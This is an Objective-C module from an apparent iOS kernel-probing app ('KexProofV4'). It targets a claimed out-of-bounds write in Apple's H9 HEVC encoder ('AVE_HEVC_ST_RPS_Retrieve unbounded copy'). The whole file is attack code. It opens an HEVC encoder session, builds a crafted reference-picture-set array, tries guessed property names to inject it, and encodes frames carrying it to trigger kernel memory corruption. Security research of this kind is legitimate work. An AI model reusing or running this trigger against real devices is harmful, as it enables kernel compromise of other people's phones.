#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
    if (status != noErr || !session) {
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: build RPS dictionary
    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
    NSMutableArray *deltaArr = [NSMutableArray array];
    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
    [report appendFormat:@"RPS: %d entries\n", 32];

    // Phase 3: systematic property name scan
    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
    NSArray *propKeys = @[
        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
    ];
    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
    for (NSString *key in propKeys) {
        for (id val in propValues) {
            status = VTSessionSetProperty(session,
                (__bridge CFStringRef)key,
                (__bridge CFPropertyListRef)val);
            if (status == 0) {
                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
            }
        }
    }
    [report appendString:@"property scan done\n"];

    // Phase 4: encode with frame properties
    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                         kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
                         NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
        VTEncodeInfoFlags flags = 0;
        CMTime pts = CMTimeMake(0, 30);
        CMTime dur = CMTimeMake(1, 30);

        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];

        pts = CMTimeMake(1, 30);
        status = VTCompressionSessionEncodeFrame(
            session, pb, pts, dur,
            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
        [report appendFormat:@"encode[1]: %d\n", (int)status];

        CVPixelBufferRelease(pb);
    }

    // Cleanup
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    [report appendString:@"\nVERDICT: H9_RECON_COMPLETE\n"];
    return report;
}

@end
